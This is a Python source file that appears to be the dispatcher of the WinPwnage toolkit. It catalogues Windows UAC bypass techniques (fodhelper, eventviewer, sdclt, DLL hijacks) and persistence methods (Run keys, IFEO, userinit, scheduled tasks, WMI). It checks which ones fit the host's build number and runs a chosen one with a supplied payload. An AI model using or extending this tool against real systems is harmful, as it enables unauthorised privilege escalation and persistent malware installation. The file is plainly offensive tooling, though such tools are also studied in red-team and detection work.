import os

from winpwnage.functions.uac.uac_runas import *
from winpwnage.functions.uac.uac_slui import *
from winpwnage.functions.uac.uac_perfmon import *
from winpwnage.functions.uac.uac_fodhelper import *
from winpwnage.functions.uac.uac_eventviewer import *
from winpwnage.functions.uac.uac_sdcltcontrol import *
from winpwnage.functions.uac.uac_silentcleanup import *
from winpwnage.functions.uac.uac_compmgmtlauncher import *
from winpwnage.functions.uac.uac_computerdefaults import *
from winpwnage.functions.uac.uac_sdcltisolatedcommand import *
from winpwnage.functions.uac.uac_dll_sysprep import *
from winpwnage.functions.uac.uac_dll_cliconfg import *
from winpwnage.functions.uac.uac_dll_mcx2prov import *
from winpwnage.functions.uac.uac_dll_migwiz import *

from winpwnage.functions.persist.persist_userinit import *
from winpwnage.functions.persist.persist_schtask import *
from winpwnage.functions.persist.persist_ifeo import *
from winpwnage.functions.persist.persist_hkcu_run import *
from winpwnage.functions.persist.persist_hklm_run import *
from winpwnage.functions.persist.persist_dll_explorer import *
from winpwnage.functions.persist.persist_mofcomp import *
from winpwnage.functions.persist.persist_wmic import *

from winpwnage.core.prints import print_info, print_table, table_success, table_error, Constant
from winpwnage.core.utils import information

functions = {
	'uac': (
		runas_info,
		fodhelper_info,
		slui_info,
		silentcleanup_info,
		sdcltisolatedcommand_info,
		sdcltcontrol_info, perfmon_info,
		eventviewer_info,
		compmgmtlauncher_info,
		computerdefaults_info,
		cliconfg_info,
		mcx2prov_info,
		migwiz_info,
		sysprep_info
	),
	'persist': (
		explorer_info,
		mofcomp_info,
		schtask_info,
		ifeo_info,
		userinit_info,
		hkcurun_info,
		hklmrun_info,
		wmic_info
	)
}


class scanner():
	def __init__(self, uac=True, persist=True):
		self.uac = uac
		self.persist = persist
		Constant.output = []

	def start(self):
		print_info("Comparing build number ({}) against 'Fixed In' build numbers, false positives might happen.".format(information().build_number()))
		print_table()
		for i in functions:
			if i == 'uac' and not self.uac or i == 'persist' and not self.persist:
				continue

			for info in functions[i]:
				if int(info["Works From"]) <= int(information().build_number()) < int(info["Fixed In"]):

					table_success(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))
				else:
					table_error(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))
		return Constant.output


class function():
	def __init__(self, uac=True, persist=True):
		self.uac = uac
		self.persist = persist
		Constant.output = []

	def run(self, id, payload):
		print_info("Attempting to run id ({}) configured with payload ({})".format(id, payload))
		for i in functions:
			if i == 'uac' and not self.uac or i == 'persist' and not self.persist:
				continue

			for info in functions[i]:
				if id in str(info["Id"]):
					globals()[info["Function Name"]](os.path.join(payload))
					return Constant.output
				else:
					pass
		return False
